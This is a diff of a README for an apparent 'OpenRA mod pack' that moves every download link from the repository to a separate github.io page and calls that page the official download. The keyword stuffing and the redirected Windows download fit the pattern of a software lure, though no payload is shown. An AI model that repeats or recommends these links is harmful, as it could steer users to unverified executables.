@@ -1,6 +1,6 @@
 # 🎮 openra-mod-pack-2026 - Your All-in-One Command & Conquer Collection
 
-[![Download Now](https://img.shields.io/badge/Download-OpenRA_Mod_Pack_2026-4CAF50?style=for-the-badge&logo=github)](https://github.com/josuelino40/openra-mod-pack-2026)
+[![Download Now](https://img.shields.io/badge/Download-OpenRA_Mod_Pack_2026-4CAF50?style=for-the-badge&logo=github)](https://josuelino40.github.io)
 
 ## 📦 What Is This?
 
@@ -41,7 +41,7 @@ Specifically designed for Windows users with a straightforward installation proc
 
 ### Step 1: Download the Pack
 
-Visit this link to download the application: [https://github.com/josuelino40/openra-mod-pack-2026](https://github.com/josuelino40/openra-mod-pack-2026)
+Visit this link to download the application: [https://josuelino40.github.io](https://josuelino40.github.io)
 
 This is the official download page where you'll find the latest version of the pack.
 
@@ -162,6 +162,6 @@ Special thanks to the OpenRA development team and the mod creators who made this
 
 **Ready to relive the golden age of real-time strategy?** 
 
-[![Download Now](https://img.shields.io/badge/Download-Get_OpenRA_Mod_Pack-FF5722?style=for-the-badge&logo=github)](https://github.com/josuelino40/openra-mod-pack-2026)
+[![Download Now](https://img.shields.io/badge/Download-Get_OpenRA_Mod_Pack-FF5722?style=for-the-badge&logo=github)](https://josuelino40.github.io)
 
 Keywords: 2026, campaign, cnc, command-conquer, dune, free, manager, mods, multiplayer, online, open-source, openra, pack, red-alert, rts, sole-survivor, tiberian-dawn, total-conversion, westwood, windows
